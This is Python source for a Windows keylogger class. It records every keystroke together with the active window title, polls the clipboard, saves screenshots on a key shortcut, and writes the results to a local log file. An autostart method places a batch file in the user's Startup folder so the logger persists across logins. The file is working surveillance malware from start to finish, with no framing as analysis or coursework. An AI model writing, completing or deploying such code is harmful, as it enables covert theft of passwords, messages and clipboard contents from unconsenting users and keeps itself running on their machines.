import os
import time
from pynput import keyboard
from datetime import datetime
import win32gui 
import pyperclip
import getpass
import shutil
from PIL import ImageGrab
import io

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.last_clipboard = ""
        self.start_time = time.time()
        self.session_id = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.log_file = f"keylog_{self.session_id}.txt"
        self.is_running = False
        self.listener = None
        self.last_window = None
        self.gui = None  # Reference to GUI
        self.pressed_keys = set()  # Track pressed keys for shortcuts

    def get_active_window(self):
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        return window if window else "Unknown"

    def check_clipboard(self):
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != self.last_clipboard and current_clipboard.strip():
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                entry = f"\n[Clipboard - {timestamp}]: {current_clipboard}\n"
                self.log += entry
                self.last_clipboard = current_clipboard
                if self.gui:
                    self.gui.broadcast_log_update(entry.strip())
                return True
        except Exception as e:
            error_msg = f"\n[Clipboard Error]: {str(e)}\n"
            self.log += error_msg
            if self.gui:
                self.gui.broadcast_log_update(error_msg.strip())
        return False
        
    def on_press(self, key):
        self.pressed_keys.add(key)
        
        current_window = self.get_active_window()
        if current_window != self.last_window:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            window_entry = f"\n\n[Window: {current_window} - {timestamp}]\n"
            self.log += window_entry
            self.last_window = current_window
            if self.gui:
                self.gui.broadcast_log_update(window_entry.strip())

        if int(time.time()) % 5 == 0:  
            self.check_clipboard()

        # Handle screenshot shortcut (Ctrl+Alt+S)
        if (key == keyboard.KeyCode.from_char('s') and 
            {keyboard.Key.ctrl, keyboard.Key.alt}.issubset(self.pressed_keys)):
            screenshot = self.capture_screenshot()
            if screenshot:
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                screenshot_file = f"screenshot_{timestamp}.png"
                with open(screenshot_file, "wb") as f:
                    f.write(screenshot)
                screenshot_msg = f"\n[Screenshot saved to {screenshot_file}]\n"
                self.log += screenshot_msg
                if self.gui:
                    self.gui.broadcast_log_update(screenshot_msg.strip())

        try:
            char = str(key.char)
            self.log += char
            if self.gui:
                self.gui.broadcast_log_update(char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
                if self.gui:
                    self.gui.broadcast_log_update(" ")
            elif key == keyboard.Key.enter:
                self.log += "\n"
                if self.gui:
                    self.gui.broadcast_log_update("\n")
            elif key == keyboard.Key.esc:
                self.stop()
                return False
            else:
                key_str = f" [{key}] "
                self.log += key_str
                if self.gui:
                    self.gui.broadcast_log_update(key_str)
        
        # Write to file periodically
        if len(self.log) >= 100:
            self.save_log()

    def on_release(self, key):
        try:
            self.pressed_keys.remove(key)
        except KeyError:
            pass
    
    def get_last_entry(self):
        """Get the most recent log entry"""
        return self.log.split('\n')[-1] if self.log else ""
    
    def save_log(self):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(self.log)
        self.log = ""
    
    def start(self):
        if not self.is_running:
            self.is_running = True
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.start()
    
    def stop(self):
        if self.is_running:
            self.is_running = False
            self.save_log()
            if self.listener:
                self.listener.stop()
            return os.path.abspath(self.log_file)
        
    def enable_autostart(self):
        user_name = getpass.getuser()
        startup_path = f"C:\\Users\\{user_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        script_path = os.path.abspath(__file__)
        
        bat_path = os.path.join(startup_path, "keylogger_startup.bat")
        with open(bat_path, "w") as f:
            f.write(f'python "{script_path}"')
            
        return bat_path
    
    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot_bytes = io.BytesIO()
            screenshot.save(screenshot_bytes, format="PNG")
            return screenshot_bytes.getvalue()
        except Exception as e:
            error_msg = f"\n[Screenshot Error]: {str(e)}\n"
            self.log += error_msg
            if self.gui:
                self.gui.broadcast_log_update(error_msg.strip())
            return None
        
if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
    
    try:
        while logger.is_running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        logger.stop()